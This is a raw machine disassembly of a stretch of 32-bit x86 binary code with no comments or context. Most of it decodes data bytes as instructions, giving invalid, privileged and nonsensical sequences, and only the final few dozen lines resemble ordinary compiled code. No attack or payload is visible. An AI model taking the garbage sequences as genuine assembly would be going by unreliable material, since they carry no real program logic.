  403054:	xchg   esi,eax
  403055:	repnz fmul DWORD PTR [edi]
  403058:	sti    
  403059:	stos   DWORD PTR es:[edi],eax
  40305a:	repnz data16 sbb bl,dh
  40305e:	push   esi
  40305f:	jmp    0x4030a1
  403061:	xor    al,0x66
  403063:	push   es
  403064:	je     0x403062
  403066:	into   
  403067:	fs mov esi,0x3e142649
  40306d:	mov    cs,WORD PTR [ebx+0x6cda29a9]
  403073:	shr    BYTE PTR [ecx-0x15],1
  403076:	mov    ebp,0x304af415
  40307b:	dec    edi
  40307c:	or     ch,cl
  40307e:	or     eax,0xea2d8d17
  403083:	mov    edi,0x27f0fa2a
  403088:	pop    ecx
  403089:	xlat   BYTE PTR ds:[ebx]
  40308a:	jbe    0x4030b2
  40308c:	add    al,0x3
  40308e:	or     DWORD PTR [ecx-0x47393879],edx
  403094:	jmp    0x7e7b:0xd7dcd8ea
  40309b:	call   0x16c1:0x85586b56
  4030a2:	jmp    0x8834dcf0
  4030a7:	aam    0xa3
  4030a9:	pop    edx
  4030aa:	cdq    
  4030ab:	jne    0x403120
  4030ad:	retf   0x2c39
  4030b0:	aas    
  4030b1:	jne    0x403097
  4030b3:	sbb    eax,0x7543b2f3
  4030b8:	or     bh,BYTE PTR [esi]
  4030ba:	and    BYTE PTR [ebp-0x63],0xf1
  4030be:	mov    cl,0x66
  4030c0:	mov    ds:0xe309fecb,eax
  4030c5:	inc    ebx
  4030c6:	test   al,0x4f
  4030c8:	fcom   QWORD PTR [eax-0x58]
  4030cb:	xchg   ecx,eax
  4030cc:	add    edi,ecx
  4030ce:	add    BYTE PTR [edx-0x6891298e],bh
  4030d4:	cwde   
  4030d5:	sahf   
  4030d6:	imul   edx,DWORD PTR [bp+di-0x66],0x5f
  4030db:	loop   0x4030b1
  4030dd:	cmp    dl,BYTE PTR gs:[edi]
  4030e0:	push   ss
  4030e1:	shl    DWORD PTR ss:[ebx+0x25524578],cl
  4030e8:	data16 add al,0x92
  4030eb:	push   edi
  4030ec:	inc    ebp
  4030ed:	mov    cl,0x87
  4030ef:	mov    esi,0x19fe6078
  4030f4:	pop    ebp
  4030f5:	xchg   edi,eax
  4030f6:	imul   ebx,ebp,0xa
  4030f9:	jne    0x4030cd
  4030fb:	xor    al,0x91
  4030fd:	jle    0x40309c
  4030ff:	jnp    0x403122
  403101:	adc    al,0xf9
  403103:	push   edx
  403104:	cli    
  403105:	sub    BYTE PTR [ecx+0x1f15e2b6],dl
  40310b:	inc    edi
  40310c:	xchg   edi,eax
  40310d:	dec    edi
  40310e:	xchg   BYTE PTR [ecx+0x76548185],dl
  403114:	pop    es
  403115:	stc    
  403116:	push   ss
  403117:	cmp    DWORD PTR [ecx+0x5f],ebp
  40311a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40311b:	dec    esi
  40311c:	adc    bl,ch
  40311e:	popf   
  40311f:	mov    esi,0xea30807d
  403124:	int3   
  403125:	cli    
  403126:	mov    DWORD PTR [edx],ecx
  403128:	pop    es
  403129:	inc    ebx
  40312a:	inc    ebx
  40312b:	rcl    BYTE PTR [edx-0x25c03521],cl
  403131:	imul   ecx,DWORD PTR [eax-0xc50f4eb],0xed5b170a
  40313b:	cdq    
  40313c:	stos   BYTE PTR es:[edi],al
  40313d:	and    eax,0x3b9f6533
  403142:	xchg   DWORD PTR [ebp-0x6f85f96e],ebx
  403148:	mov    dl,0xad
  40314a:	dec    ebp
  40314b:	out    dx,al
  40314c:	dec    edi
  40314d:	jnp    0x403164
  40314f:	fiadd  DWORD PTR [ebp-0x2a7040d0]
  403155:	mov    eax,0xeeb97585
  40315a:	rcr    BYTE PTR [edx+0x5e9acd06],1
  403160:	mov    esi,0xbfd1d0d7
  403165:	ds pop ebx
  403167:	cli    
  403168:	pop    ss
  403169:	mov    WORD PTR [edx-0x5d],fs
  40316c:	arpl   WORD PTR [eax+ebx*8],cx
  40316f:	sub    eax,0xe3de9ed8
  403174:	scas   eax,DWORD PTR es:[edi]
  403175:	sar    DWORD PTR [ebp+0x32],cl
  403178:	mov    cl,0x9
  40317a:	repnz loop 0x4031d7
  40317d:	xor    BYTE PTR [edx*1-0x4baa7062],al
  403184:	imul   ecx,DWORD PTR [ecx],0xe1851cdd
  40318a:	sub    al,0x1b
  40318c:	test   ebx,esp
  40318e:	hlt    
  40318f:	scas   eax,DWORD PTR es:[edi]
  403190:	lods   eax,DWORD PTR ds:[esi]
  403191:	imul   edi,DWORD PTR [ebx+0x20e38481],0x259c4b2a
  40319b:	mov    WORD PTR [ecx],es
  40319d:	popa   
  40319e:	in     al,dx
  40319f:	mov    ds:0x7abe7de0,eax
  4031a4:	push   ss
  4031a5:	lea    ebp,[ecx+0x18e60026]
  4031ab:	xchg   esp,eax
  4031ac:	aas    
  4031ad:	dec    edi
  4031ae:	cmc    
  4031af:	pop    eax
  4031b0:	stc    
  4031b1:	shr    DWORD PTR [ecx+0xe],cl
  4031b4:	sbb    al,BYTE PTR [ecx-0x6100352b]
  4031ba:	aas    
  4031bb:	xor    bl,BYTE PTR [esi-0x8]
  4031be:	ins    DWORD PTR es:[edi],dx
  4031bf:	sbb    DWORD PTR [edi],0x8
  4031c2:	daa    
  4031c3:	xor    bl,BYTE PTR [esi-0x30]
  4031c6:	adc    BYTE PTR [edi+0x58a138c],al
  4031cc:	daa    
  4031cd:	add    BYTE PTR [ebx*4-0x2a1504a6],bh
  4031d4:	xlat   BYTE PTR ds:[ebx]
  4031d5:	pop    esp
  4031d6:	push   esp
  4031d7:	jmp    0x495c49fd
  4031dc:	iret   
  4031dd:	dec    esi
  4031de:	jbe    0x4031dd
  4031e0:	or     al,0xdb
  4031e2:	xor    cl,dh
  4031e4:	test   eax,ebx
  4031e6:	push   cs
  4031e7:	loopne 0x403259
  4031e9:	mov    ?,WORD PTR [esi]
  4031eb:	cmp    ebp,esp
  4031ed:	sbb    BYTE PTR [edi-0x58],cl
  4031f0:	mov    ch,0x5
  4031f2:	das    
  4031f3:	pop    edi
  4031f4:	imul   eax,DWORD PTR [ebx],0x5d
  4031f7:	pop    ss
  4031f8:	data16 adc al,0xa3
  4031fb:	stos   DWORD PTR es:[edi],eax
  4031fc:	jp     0x403273
  4031fe:	pushf  
  4031ff:	xor    al,0xa3
  403201:	and    eax,0x13bcdc1
  403206:	and    eax,0xe8124d9b
  40320b:	scas   eax,DWORD PTR es:[edi]
  40320c:	mov    ah,0x14
  40320e:	mov    ebx,0xdee3de75
  403213:	(bad)  
  403215:	cld    
  403216:	inc    esp
  403217:	ds push ebp
  403219:	mov    DWORD PTR [edi+0x1969de7f],ebp
  40321f:	ret    
  403220:	out    dx,al
  403221:	div    ecx
  403223:	ins    BYTE PTR es:[edi],dx
  403224:	test   eax,0x227a9c3a
  403229:	ds jne 0x403216
  40322c:	mov    dh,0x4c
  40322e:	push   esi
  40322f:	imul   ebp,edi,0x51
  403232:	mov    ebx,0x75dfac85
  403237:	out    0x4,al
  403239:	pop    ss
  40323a:	inc    ebx
  40323b:	add    ebp,0xffffffdd
  40323e:	sahf   
  40323f:	retf   
  403240:	xchg   esp,eax
  403241:	in     al,dx
  403242:	mov    ebp,0xa92ae66b
  403247:	mov    edi,0xc5aec337
  40324c:	xchg   edi,eax
  40324d:	(bad)  
  40324e:	popa   
  40324f:	push   es
  403250:	mov    eax,ds:0x7661d30b
  403255:	sar    BYTE PTR [ebx-0x5138161e],0x16
  40325c:	test   cl,bh
  40325e:	mov    ebp,0x28ff788
  403263:	add    eax,0x487306fd
  403268:	int    0xa0
  40326a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40326b:	cli    
  40326c:	sub    ah,ah
  40326e:	cwde   
  40326f:	mov    ch,0x5f
  403271:	and    DWORD PTR [ebx-0x3a],eax
  403274:	xchg   ebp,eax
  403275:	in     al,dx
  403276:	retf   0xa89f
  403279:	push   ds
  40327a:	or     esp,DWORD PTR [esi+0x303ad4ec]
  403280:	jle    0x4032ef
  403282:	outs   dx,DWORD PTR ds:[esi]
  403283:	mov    ds:0x86deceac,al
  403288:	add    edi,ebx
  40328a:	or     DWORD PTR [ecx+eiz*4-0x27377b64],edi
  403291:	shld   eax,edi,0x72
  403295:	jmp    0x40327e
  403297:	inc    esi
  403298:	retf   0xb552
  40329b:	loop   0x4032a0
  40329d:	int    0xaf
  40329f:	ret    
  4032a0:	or     ecx,esi
  4032a2:	xlat   BYTE PTR ds:[ebx]
  4032a3:	mov    eax,ds:0x90259ee6
  4032a8:	inc    ecx
  4032a9:	loopne 0x403291
  4032ab:	addr16 pusha 
  4032ad:	mov    al,ds:0xc229513
  4032b2:	jnp    0x4032af
  4032b4:	jge    0x4032cc
  4032b6:	mov    dh,0x42
  4032b8:	jmp    0x2a4b:0xac21e414
  4032bf:	inc    edi
  4032c0:	pop    edx
  4032c1:	scas   al,BYTE PTR es:[edi]
  4032c2:	hlt    
  4032c3:	sar    edi,cl
  4032c5:	adc    eax,0xf4171eab
  4032cb:	jo     0x4032bb
  4032cd:	fdiv   st,st(0)
  4032cf:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032d1:	inc    edx
  4032d2:	add    bh,BYTE PTR [edx+0x742a0c9]
  4032d8:	xor    al,0x1
  4032da:	leave  
  4032db:	aaa    
  4032dc:	repz rcl DWORD PTR [eax],1
  4032df:	out    dx,al
  4032e0:	rol    BYTE PTR [edi],1
  4032e2:	jg     0x4032e6
  4032e4:	jle    0x4032f5
  4032e6:	xlat   BYTE PTR ds:[ebx]
  4032e7:	int3   
  4032e8:	or     DWORD PTR [ecx],eax
  4032ea:	(bad)  
  4032ec:	out    dx,al
  4032ed:	sub    BYTE PTR [eax+esi*1],0xec
  4032f1:	cdq    
  4032f2:	cmp    DWORD PTR [ecx],edx
  4032f4:	mov    ebx,ebx
  4032f6:	nop
  4032f7:	and    al,0x1a
  4032f9:	push   es
  4032fa:	(bad)  
  4032fb:	dec    edx
  4032fc:	pop    es
  4032fd:	sub    eax,0xbb3c59e3
  403302:	leave  
  403303:	push   eax
  403304:	ret    0x8e4a
  403307:	js     0x4032a2
  403309:	out    0xa4,al
  40330b:	stos   BYTE PTR es:[edi],al
  40330c:	sbb    BYTE PTR [esi+edi*4-0x61f1dc23],bh
  403313:	xchg   DWORD PTR [ebx-0x4765d01f],esp
  403319:	cmp    al,0x9a
  40331b:	out    0x6d,eax
  40331d:	sbb    cl,BYTE PTR [edi+0x2c]
  403320:	popa   
  403321:	loopne 0x40331c
  403323:	retf   
  403324:	fild   WORD PTR [ecx]
  403326:	bound  edx,QWORD PTR [edx+eiz*8+0x7f]
  40332a:	xchg   ebx,eax
  40332b:	or     DWORD PTR [ebx-0x77],esi
  40332e:	inc    edx
  40332f:	(bad)  
  403330:	dec    ebx
  403331:	mov    ebp,0x98a3b07a
  403336:	lock mov dh,0x38
  403339:	jbe    0x403359
  40333b:	or     DWORD PTR [edi-0x3f],0x98e125d7
  403342:	arpl   WORD PTR [esi+ebp*2+0x7a53df66],ax
  403349:	cs xor eax,0x8169613
  40334f:	(bad)  
  403350:	test   eax,0x63a006e7
  403355:	sub    bh,bh
  403357:	and    BYTE PTR [ebx+0x5],0x14
  40335b:	(bad)  
  40335c:	and    BYTE PTR [esi-0x77d504c1],ah
  403362:	fsubr  DWORD PTR [ebx]
  403364:	jo     0x403366
  403366:	gs mov ebx,0x39552c2d
  40336c:	xor    eax,0x165fe399
  403371:	cmp    DWORD PTR [esi+0x23],edi
  403374:	js     0x4033ef
  403376:	mov    DWORD PTR [edi+esi*2+0x45214fa3],edx
  40337d:	cmc    
  40337e:	(bad)  
  40337f:	iret   
  403380:	rol    DWORD PTR [edx],1
  403382:	mov    al,ds:0xf938d7b4
  403387:	frstor [ecx+0x62]
  40338a:	dec    ebp
  40338b:	mov    bl,0xbf
  40338d:	push   ecx
  40338e:	xor    esi,DWORD PTR [esi-0x47]
  403391:	add    DWORD PTR [ecx+0x28841c],edi
  403397:	scas   al,BYTE PTR es:[edi]
  403398:	popf   
  403399:	lds    edx,FWORD PTR [edx-0x2afae00a]
  40339f:	dec    edi
  4033a0:	mov    edx,0xe272ea0
  4033a5:	stos   BYTE PTR es:[edi],al
  4033a6:	jmp    0x4033f7
  4033a8:	sub    ecx,ecx
  4033aa:	adc    BYTE PTR [ebx+0x1ce24798],0xa7
  4033b1:	and    bh,BYTE PTR [ebx-0x5185cfab]
  4033b7:	arpl   si,bx
  4033b9:	hlt    
  4033ba:	outs   dx,BYTE PTR ds:[esi]
  4033bb:	sub    BYTE PTR [ecx+0x71],ch
  4033be:	adc    eax,edx
  4033c0:	adc    ch,bh
  4033c2:	mov    ah,0xc8
  4033c4:	sbb    DWORD PTR [esi+0x19f7b1ae],esi
  4033ca:	int    0xb2
  4033cc:	scas   eax,DWORD PTR es:[edi]
  4033cd:	cs sbb al,0x27
  4033d0:	retf   
  4033d1:	xor    eax,0xebf91721
  4033d6:	lods   eax,DWORD PTR ds:[esi]
  4033d7:	hlt    
  4033d8:	mov    ah,0x4d
  4033da:	in     eax,0xa5
  4033dc:	lds    esp,FWORD PTR [ebp+0x278edef4]
  4033e2:	mov    eax,ds:0x56c9733a
  4033e7:	and    DWORD PTR [esi-0x4b],ebp
  4033ea:	jns    0x4033b9
  4033ec:	xlat   BYTE PTR ds:[ebx]
  4033ed:	push   ecx
  4033ee:	lock fstp QWORD PTR es:[si-0xa]
  4033f4:	ret    
  4033f5:	xchg   edx,eax
  4033f6:	lods   eax,DWORD PTR ds:[esi]
  4033f7:	add    al,0xdc
  4033f9:	(bad)  [edi+0x5fd287ac]
  4033ff:	fisub  WORD PTR [esi+0x69226c0b]
  403405:	jecxz  0x4033c5
  403407:	jo     0x40341f
  403409:	mov    ah,0x3e
  40340b:	scas   al,BYTE PTR es:[edi]
  40340c:	jbe    0x403463
  40340e:	jle    0x403435
  403410:	pop    esp
  403411:	pop    edi
  403412:	add    esi,ebx
  403414:	add    bh,bl
  403416:	loop   0x403488
  403418:	pop    esp
  403419:	scas   al,BYTE PTR es:[edi]
  40341a:	sub    al,0x33
  40341c:	cwde   
  40341d:	fs dec ecx
  40341f:	dec    esi
  403420:	or     bh,BYTE PTR [ecx]
  403422:	cld    
  403423:	sub    BYTE PTR [eax+0x21287e42],0xd0
  40342a:	pmulhuw mm0,QWORD PTR [edx+edx*8]
  40342e:	fistp  QWORD PTR [esi]
  403430:	test   al,0xde
  403432:	test   dh,ah
  403434:	out    0xb9,al
  403436:	jmp    0xde3b:0xaf1ca7f0
  40343d:	ret    0xe263
  403440:	out    dx,al
  403441:	int3   
  403442:	ret    0x9fe4
  403445:	inc    esp
  403446:	int    0xb4
  403448:	test   edx,ecx
  40344a:	dec    ecx
  40344b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40344c:	xor    BYTE PTR [esi+0x57],dl
  40344f:	shl    BYTE PTR [ecx-0x67],0xca
  403453:	xor    eax,0x52760fde
  403458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403459:	mov    dl,BYTE PTR [eax]
  40345b:	(bad)  
  40345c:	pop    ss
  40345d:	pop    esi
  40345e:	xor    DWORD PTR [edx-0x5a2f3c22],edi
  403464:	retf   
  403465:	outs   dx,DWORD PTR ds:[esi]
  403466:	sub    DWORD PTR [edi-0x74ebad37],0xfffffff7
  40346d:	dec    edx
  40346e:	leave  
  40346f:	jo     0x403498
  403471:	rcr    BYTE PTR [edi+0x4ada4f28],1
  403477:	xor    al,0x45
  403479:	push   es
  40347a:	cdq    
  40347b:	push   ecx
  40347c:	mov    ecx,0x3d92f2f5
  403481:	jle    0x4034fd
  403483:	test   eax,0xaabfb432
  403488:	adc    DWORD PTR [eax-0x35b938c3],esp
  40348e:	fsub   QWORD PTR [ebp+0x3f98f446]
  403494:	sbb    edx,edx
  403496:	fild   WORD PTR [eax-0x7b]
  403499:	lock bnd jle 0x403437
  40349d:	or     al,0x91
  40349f:	mov    eax,ds:0x904fe4f1
  4034a5:	mov    fs,edx
  4034a7:	(bad)  
  4034a8:	push   cs
  4034a9:	push   es
  4034aa:	leave  
  4034ab:	iret   
  4034ac:	jnp    0x40343d
  4034ae:	push   ecx
  4034af:	dec    esi
  4034b0:	iret   
  4034b1:	inc    esi
  4034b2:	hlt    
  4034b3:	xchg   esp,eax
  4034b4:	call   0xb7cf:0x1c949f34
  4034bb:	lea    ecx,[esi+0x7e]
  4034be:	aam    0xaf
  4034c0:	pop    ss
  4034c1:	and    DWORD PTR [ebx+0x58],esi
  4034c4:	fiadd  WORD PTR [eax-0x56e5f1ab]
  4034ca:	call   0xe18b1823
  4034cf:	fwait
  4034d0:	aad    0x4f
  4034d2:	adc    ch,cl
  4034d4:	jo     0x40345d
  4034d6:	jmp    0x9977:0x81e98274
  4034dd:	(bad)  
  4034de:	mov    dh,0x76
  4034e0:	clc    
  4034e1:	aaa    
  4034e2:	dec    ebp
  4034e3:	sub    DWORD PTR [ebp+0x73f3affa],esi
  4034e9:	(bad)  
  4034ea:	jns    0x403532
  4034ec:	or     eax,0x89a381b9
  4034f1:	mov    edi,DWORD PTR [edi+0x4071f2fa]
  4034f7:	adc    eax,DWORD PTR [edx]
  4034f9:	inc    ebp
  4034fa:	inc    ecx
  4034fb:	retf   0x50e9
  4034fe:	pop    ebp
  4034ff:	inc    edx
  403500:	pop    edx
  403501:	and    eax,0x44c846db
  403506:	dec    ecx
  403507:	xchg   ah,cl
  403509:	and    al,0xb
  40350b:	mov    al,ds:0xa2fd41e5
  403510:	cli    
  403511:	mov    esi,0xf77a0fc7
  403516:	fstp   DWORD PTR [ebp-0x4]
  403519:	push   edi
  40351a:	push   0x51
  40351c:	mov    WORD PTR [ebp+0x6e],ss
  40351f:	xchg   ecx,eax
  403520:	or     al,0x47
  403522:	pop    edi
  403523:	repnz pusha 
  403525:	or     BYTE PTR [eax],bl
  403527:	xor    ch,BYTE PTR [esp+ebx*8-0x12bb8351]
  40352e:	xchg   BYTE PTR [edx+0x1fb4df10],ch
  403534:	repz sbb BYTE PTR [ecx],ah
  403537:	jae    0x40359c
  403539:	or     eax,0x2890d679
  40353e:	push   0x74e01aa
  403543:	cli    
  403544:	iret   
  403545:	clc    
  403546:	dec    eax
  403547:	daa    
  403548:	mov    cl,0xc8
  40354a:	sub    BYTE PTR [ebx+0x29ef7c25],dh
  403550:	aad    0x1d
  403552:	pop    ss
  403553:	mov    dl,0x1
  403555:	push   ebx
  403556:	mov    edx,0x95f1cf50
  40355b:	sub    BYTE PTR [esi+0x25],dh
  40355e:	rcr    BYTE PTR [ebp-0x47],0x7f
  403562:	jo     0x403553
  403564:	jmp    0x40358f
  403566:	test   DWORD PTR [ebp+esi*1+0x35],0x53c563d0
  40356e:	jg     0x40357f
  403570:	add    al,0x2c
  403572:	or     al,0x7
  403574:	mov    ?,WORD PTR [ebp+0x6f70da65]
  40357a:	xchg   BYTE PTR [edi-0x62603f54],ah
  403580:	pop    es
  403581:	sub    DWORD PTR [ecx+0x15],esp
  403584:	adc    esp,esp
  403586:	call   0x8371:0x81041657
  40358d:	xchg   edx,eax
  40358e:	ins    DWORD PTR es:[edi],dx
  40358f:	cwde   
  403590:	bound  edi,QWORD PTR [edx]
  403592:	jns    0x403568
  403594:	dec    edi
  403595:	fld    TBYTE PTR [ebp+0x27]
  403598:	sub    dh,BYTE PTR [esp+esi*2-0x41b79007]
  40359f:	inc    edi
  4035a0:	repz or DWORD PTR [edi-0x6c89e221],esp
  4035a7:	push   edi
  4035a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035a9:	js     0x4035c0
  4035ab:	push   ds
  4035ac:	mov    cl,0x8e
  4035ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035af:	mov    esi,0x19802bef
  4035b4:	pop    ds
  4035b5:	sar    BYTE PTR [ebx+0x33090e8e],1
  4035bb:	and    eax,0xa42e3846
  4035c0:	sub    bh,BYTE PTR [esi+0x64]
  4035c3:	push   edx
  4035c4:	sub    BYTE PTR [edx-0x2871ad7e],bl
  4035ca:	out    dx,al
  4035cb:	inc    esi
  4035cc:	adc    DWORD PTR [edx-0xb8a8857],eax
  4035d2:	adc    esp,DWORD PTR [edx-0x3]
  4035d5:	jmp    FWORD PTR [ebp-0x1]
  4035d8:	xor    cl,BYTE PTR [eax-0xe]
  4035db:	test   eax,0xf1c31db8
  4035e0:	and    esp,DWORD PTR [edx+ebp*2+0x50]
  4035e4:	xor    DWORD PTR [eax-0xf],esp
  4035e7:	jecxz  0x403622
  4035e9:	jecxz  0x403606
  4035eb:	fcom   QWORD PTR [ecx+edi*1+0x14b05200]
  4035f2:	and    bh,BYTE PTR [edx]
  4035f4:	in     al,0xa3
  4035f6:	pusha  
  4035f7:	inc    ebp
  4035f8:	loop   0x403631
  4035fa:	fisttp WORD PTR es:[edx+0x20764db7]
  403601:	xor    BYTE PTR [ebp+0x6d4c19f7],ch
  403607:	push   esp
  403608:	and    al,0xa7
  40360a:	repz add DWORD PTR [edi+edi*2],0xffffffa5
  40360f:	(bad)  
  403611:	jmp    0xba94:0xf739a7f6
  403618:	pop    esp
  403619:	dec    edx
  40361a:	sahf   
  40361b:	hlt    
  40361c:	pusha  
  40361d:	mov    ecx,0xb272940f
  403622:	leave  
  403623:	mov    ecx,0x73301b20
  403628:	xor    BYTE PTR [edi-0x469cd068],bl
  40362e:	jmp    0x40366d
  403630:	ins    DWORD PTR es:[edi],dx
  403631:	jne    0x4035e4
  403633:	out    dx,al
  403634:	retf   
  403635:	jge    0x403640
  403637:	cmp    ebx,DWORD PTR [ebx+0xf]
  40363a:	pop    ss
  40363b:	push   ss
  40363c:	lahf   
  40363d:	ds popa 
  40363f:	aam    0xc6
  403641:	sar    DWORD PTR [eax+0x484febfc],1
  403647:	test   eax,0x8540f8cf
  40364c:	sbb    dl,bh
  40364e:	pop    ds
  40364f:	imul   edx,DWORD PTR [esi],0x7a
  403652:	stos   DWORD PTR es:[edi],eax
  403653:	sub    BYTE PTR [ebx-0x66],al
  403656:	mov    esi,DWORD PTR [ebx+ecx*2-0x31]
  40365a:	and    BYTE PTR [edx-0x31],bh
  40365d:	je     0x4036cd
  40365f:	aaa    
  403660:	push   eax
  403661:	mov    ebx,0xaa7132af
  403666:	jb     0x403604
  403668:	mov    edx,0x5cc49049
  40366d:	es jb  0x403690
  403670:	jg     0x40364f
  403672:	gs dec ebp
  403674:	jmp    0x4036f5
  403676:	test   ch,dl
  403678:	pop    edx
  403679:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40367b:	popf   
  40367c:	adc    al,0xe8
  40367e:	cmp    DWORD PTR [ecx-0x23],eax
  403681:	fsub   DWORD PTR [ebx+0x40]
  403684:	jmp    0x288b:0xf1dc
  40368a:	(bad)
  40368d:	ins    BYTE PTR es:[edi],dx
  40368e:	test   ecx,esi
  403690:	pushf  
  403691:	shr    DWORD PTR ds:0xcc5f2242,1
  403697:	pop    ebp
  403698:	pusha  
  403699:	aad    0xbe
  40369b:	xor    al,0x0
  40369d:	push   esp
  40369e:	ret    
  40369f:	ins    DWORD PTR es:[edi],dx
  4036a0:	les    edi,FWORD PTR [ecx-0x69]
  4036a3:	lock add BYTE PTR [esi],dh
  4036a6:	mov    esi,0xb01b0ee2
  4036ab:	ds js  0x403684
  4036ae:	push   es
  4036af:	push   esi
  4036b0:	in     al,0xe9
  4036b2:	fsub   st(0),st
  4036b4:	ror    ecx,0x60
  4036b7:	cmp    DWORD PTR [esi+ebx*8+0x32],esp
  4036bb:	stos   BYTE PTR es:[edi],al
  4036bc:	into   
  4036bd:	pop    edx
  4036be:	xchg   edx,eax
  4036bf:	imul   edx,DWORD PTR [ebx],0xf2d4d5a
  4036c5:	xchg   ebp,eax
  4036c6:	push   cs
  4036c7:	out    dx,al
  4036c8:	dec    ecx
  4036c9:	cmp    DWORD PTR [eax+0x1e],ecx
  4036cc:	xor    eax,0x3b3d4683
  4036d1:	fdiv   QWORD PTR [ebp-0x89b956a]
  4036d7:	out    0xd0,eax
  4036d9:	adc    dl,bh
  4036db:	mov    esp,0x55a8cbc7
  4036e0:	imul   eax,ebp,0x94538599
  4036e6:	jg     0x4036b1
  4036e8:	and    DWORD PTR [ebx-0x7e640955],ebx
  4036ee:	dec    ebx
  4036ef:	pop    ebx
  4036f0:	(bad)  
  4036f1:	fidiv  WORD PTR [ecx+ebp*4+0x27]
  4036f5:	mov    dh,0x75
  4036f7:	xchg   DWORD PTR [ebp+0x1a],ebx
  4036fa:	imul   eax,DWORD PTR [esi+0x40],0x5b
  4036fe:	pcmpeqw mm5,QWORD PTR [esi]
  403701:	jl     0x4036b2
  403703:	nop
  403704:	stos   DWORD PTR es:[edi],eax
  403705:	in     eax,dx
  403706:	test   BYTE PTR [ebx],dh
  403708:	add    eax,0xa72c66bd
  40370d:	or     eax,0x4a98e518
  403712:	jae    0x4036ae
  403714:	out    dx,eax
  403715:	or     bh,BYTE PTR [esp+eax*2-0x35]
  403719:	and    BYTE PTR [edx],ch
  40371b:	sub    BYTE PTR [edx-0x18244989],dl
  403721:	dec    edi
  403722:	push   esp
  403723:	or     BYTE PTR [eax],0xc
  403726:	jl     0x403767
  403728:	retf   
  403729:	xor    DWORD PTR [edi],esp
  40372b:	hlt    
  40372c:	icebp  
  40372d:	arpl   di,ax
  40372f:	mov    dh,0xfe
  403731:	or     ecx,ebx
  403733:	vpunpckhqdq xmm4,xmm3,XMMWORD PTR [ebp+0x3a]
  403738:	ficom  DWORD PTR [edx]
  40373a:	scas   al,BYTE PTR es:[edi]
  40373b:	call   0x88da:0xa2b11f7b
  403742:	ret    
  403743:	fdivr  DWORD PTR [ecx]
  403745:	and    edi,esp
  403747:	adc    BYTE PTR [eax-0x3d],bh
  40374a:	jmp    0x4036d5
  40374c:	inc    esi
  40374d:	pop    esi
  40374e:	xchg   ebp,eax
  40374f:	ror    dh,cl
  403751:	push   0x68
  403753:	push   cs
  403754:	and    bh,BYTE PTR [edi+eiz*4]
  403757:	jl     0x40374f
  403759:	and    ah,BYTE PTR [edx-0x7]
  40375c:	stos   BYTE PTR es:[edi],al
  40375d:	pop    edx
  40375e:	pop    ss
  40375f:	dec    ebx
  403760:	es push cs
  403762:	lds    ecx,FWORD PTR [eax+0x465b55b6]
  403768:	inc    ebx
  403769:	push   esi
  40376a:	pop    esi
  40376b:	sub    edx,ebx
  40376d:	int3   
  40376e:	test   al,0x46
  403770:	neg    DWORD PTR [esi-0x1e]
  403773:	xchg   sp,ax
  403775:	sbb    BYTE PTR [ecx-0x74],dh
  403778:	mov    gs,WORD PTR [ecx]
  40377a:	out    0xdd,eax
  40377c:	ret    0xea64
  40377f:	jno    0x4037b0
  403781:	cmp    DWORD PTR ds:[ebx+0x474691dc],esi
  403788:	or     eax,0x8d8be675
  40378d:	push   eax
  40378e:	(bad)  
  40378f:	test   al,0xe8
  403791:	mov    ?,WORD PTR [ebx+0x3d4a9be7]
  403797:	push   0x7a
  403799:	test   DWORD PTR [eax],edx
  40379b:	xor    eax,0x5e496ec5
  4037a0:	test   BYTE PTR [ebp-0x36507e1f],bl
  4037a6:	jmp    0x403737
  4037a8:	sar    BYTE PTR [eax+0x0],1
  4037ab:	imul   edi,DWORD PTR [esi+0x572660d],0xb9527cad
  4037b5:	js     0x4037ee
  4037b7:	es or  ch,al
  4037ba:	popf   
  4037bb:	ins    BYTE PTR es:[edi],dx
  4037bc:	pop    ds
  4037bd:	fistp  QWORD PTR [edi]
  4037bf:	pop    es
  4037c0:	cmp    esp,edx
  4037c2:	aad    0xe3
  4037c4:	xchg   ebp,eax
  4037c5:	add    al,dh
  4037c7:	sbb    BYTE PTR [ecx-0x1fae998c],0x91
  4037ce:	fidivr WORD PTR [esi]
  4037d0:	pop    es
  4037d1:	(bad)  
  4037d2:	cli    
  4037d3:	jns    0x40377a
  4037d5:	stos   BYTE PTR es:[edi],al
  4037d6:	lock xchg esi,eax
  4037d8:	adc    ch,bl
  4037da:	xor    ebp,0x3a
  4037dd:	enter  0x6ab8,0x87
  4037e1:	xor    ecx,DWORD PTR [esi+ebp*4-0x52]
  4037e5:	push   es
  4037e6:	pop    edx
  4037e7:	pushf  
  4037e8:	aam    0xf6
  4037ea:	jge    0x4037c7
  4037ec:	hlt    
  4037ed:	pop    ecx
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
